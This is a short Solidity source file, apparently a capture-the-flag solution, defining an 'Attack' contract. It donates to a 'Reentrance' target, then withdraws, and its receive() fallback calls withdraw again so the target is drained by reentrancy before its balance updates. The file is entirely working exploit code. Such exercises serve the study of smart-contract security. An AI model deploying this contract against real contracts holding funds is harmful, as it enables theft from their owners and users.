//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Target.sol";

contract Attack {
    Reentrance public target;

    constructor(address payable _target) public {
        target = Reentrance(_target);
    }

    function attack() public payable {
        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }

    receive() external payable {
        target.withdraw(100000000000000);
    }
}
